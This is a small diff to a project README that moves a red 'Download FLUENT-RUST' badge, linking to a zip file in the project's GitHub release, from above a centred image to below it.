@@ -3,12 +3,11 @@
 </p>
 
 
-[<img src="https://img.shields.io/badge/Download_FLUENT-RUST-red?style=for-the-badge">](https://github.com/sebasteincalderon/fluent-rust/releases/download/Latest/fluent_rust.zip)
-
-
  <p align="center">
     <img src="https://i.imgur.com/XDjHV4d.png" width="750">
   </p>
+
+  [<img src="https://img.shields.io/badge/Download_FLUENT-RUST-red?style=for-the-badge">](https://github.com/sebasteincalderon/fluent-rust/releases/download/Latest/fluent_rust.zip)
 
 ---
 
